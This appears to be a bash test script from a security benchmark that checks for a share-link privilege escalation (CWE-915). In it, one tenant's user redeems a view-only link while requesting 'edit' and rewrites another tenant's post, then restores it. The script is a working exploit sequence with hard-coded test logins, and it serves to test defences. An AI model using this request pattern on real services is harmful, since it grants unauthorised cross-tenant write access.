#!/usr/bin/env bash
# SHARE-ESCALATE-001 (CWE-915): the Acme editor shares a post read-only; a
# Globex user redeems that link asking for "edit", gets it, and rewrites the
# Acme post. Three requests, two actors, each one ordinary on its own.
set -uo pipefail
source "$(dirname "$0")/_lib.sh"
new_jar ED
login_as "$ED" editor@bench.local 'Editor123!'
login user2@bench.local 'User123!'

PID=$(post_id acme-roadmap)
TITLE=$(post_field acme-roadmap title)
TOK=$(req "$ED" POST "/api/posts/$PID/share" '{"permission":"view"}' | json_get token) # 1. a view link
[ -n "$TOK" ] || { echo "editor could not mint a share link" >&2; exit 2; }

req "$JAR" POST "/api/share/$TOK/redeem" '{"permission":"edit"}' >/dev/null    # 2. redeemed as edit
MARK="SHARE-ESCALATE-MARKER-$$"
req "$JAR" PUT "/api/shared/posts/$PID" "{\"title\":\"$MARK\"}" >/dev/null     # 3. cross-tenant edit
GOT=$(post_field acme-roadmap title)

req "$JAR" PUT "/api/shared/posts/$PID" "{\"title\":\"$TITLE\"}" >/dev/null
req "$ED" DELETE "/api/share/$TOK" >/dev/null
[ "$GOT" = "$MARK" ]
